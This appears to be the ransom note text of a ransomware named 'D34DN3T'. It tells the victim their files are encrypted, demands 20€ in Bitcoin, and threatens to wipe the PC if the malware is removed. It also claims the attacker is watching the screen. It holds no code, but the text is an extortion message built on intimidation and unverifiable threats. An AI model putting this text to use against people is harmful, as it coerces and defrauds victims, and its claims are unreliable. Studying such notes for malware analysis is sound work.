    Hello, you got infected by a ransomware called D34DN3T. At this point, your files are encrypted and
    no one can help you. Only thing you can do is to pay via Bitcoins. Price of decryption is 20â‚¬.
    If you do not know how to pay check some tutorials on google or youtube. Do not try to
    remove or delete this ransomware, but if you do, then everything in your PC will be deleted,
    within a seconds. I can see your screen and I see what you are doing on your PC, so dont be silly.
    Lets hop into it.
